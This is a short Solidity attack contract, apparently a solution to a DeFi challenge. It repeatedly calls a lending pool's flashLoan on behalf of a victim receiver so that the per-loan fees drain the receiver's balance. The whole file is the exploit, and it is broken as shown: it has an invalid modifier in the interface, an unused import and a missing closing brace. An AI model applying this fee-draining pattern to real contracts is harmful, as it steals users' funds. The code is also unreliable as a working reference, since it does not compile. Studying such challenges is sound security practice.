pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IPoolFunc {
	function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant;
}


contract AttackYou2 {
    using Address for address;

    address payable private pool;
	address payable private receiver;
	
	uint256 fee = 1;
	

    constructor(address payable poolAddress, address payable receiverAddress) {
        pool = poolAddress;
		receiver = receiverAddress;
		attack();
		
    }


    function attack() public payable {
	
		uint8 counter = 0;
		uint8 max_iterations = 13;
		
		while(receiver.balance >= fee) {
			IPoolFunc(pool).flashLoan(receiver, 1);
			counter += 1;
			if (counter > max_iterations){
				break;
				}
			
	}
}
